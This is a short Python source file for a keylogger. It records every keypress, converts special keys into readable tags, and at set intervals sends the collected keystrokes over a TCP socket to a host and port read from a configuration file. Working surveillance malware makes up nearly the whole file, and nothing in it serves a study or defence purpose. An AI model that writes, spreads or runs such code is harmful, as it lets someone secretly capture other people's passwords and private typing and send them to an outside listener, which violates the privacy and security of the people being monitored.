import keyboard
from threading import Semaphore, Timer
import sys
import signal
import socket
import configparser

report_time = 4
host = '127.0.0.1'
port = 5003

def interrupt_handler(signal, frame):
    client.close()
    print("[*] Keyboard Interrupt")
    print("[-] Exiting...")
    sys.exit(0)

def getaddr():
    conf = configparser.ConfigParser()
    conf.read_file(open('key.conf'))
    host = conf.get('connection','host')
    port = conf.get('connection','port')
    return (host,port)

def getinterval():
    conf = configparser.ConfigParser()
    conf.read_file(open('key.conf'))
    intv = conf.get('interval','time_interval')
    return intv

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
addr = getaddr()
client.connect(addr)
    
class Keylogger:
    def __init__(self, interval):
        self.log = ""
        self.interval = interval
        self.semaphore = Semaphore(0)

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    def report(self):
        if self.log: 
            print(self.log)
            client.send(self.log.encode("utf-8"))
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()


    def start(self):
        keyboard.on_press(callback=self.callback)
        self.report()
        self.semaphore.acquire()
    
    def stop(self):
        self.semaphore.release()
        sys.exit()

    
if __name__ == "__main__":
    signal.signal(signal.SIGINT, interrupt_handler)
    keylogger = Keylogger(interval=getinterval())
    keylogger.start()